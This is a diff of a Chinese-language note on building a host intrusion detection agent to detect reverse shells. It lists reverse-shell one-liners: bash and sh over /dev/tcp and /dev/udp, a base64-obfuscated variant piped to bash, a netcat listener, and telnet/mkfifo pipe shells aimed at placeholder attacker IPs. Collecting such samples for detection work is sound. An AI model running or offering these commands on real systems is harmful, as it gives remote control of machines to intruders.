@@ -14,7 +14,6 @@ Summary: HIDS-Agent开发之检测反弹shell ~
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 
-sh -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
 
 0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
 
@@ -22,18 +21,29 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 
 nohup bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 
-#Stealthier method
+
+base64搞一下命令
+
 #B64 encode the shell like: echo "nohup bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
+
+sh -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
+
+Listener:
+nc -u -lvp 4242
 
 ```
 
 
 
+
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
+
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
+
 telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
+
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
 
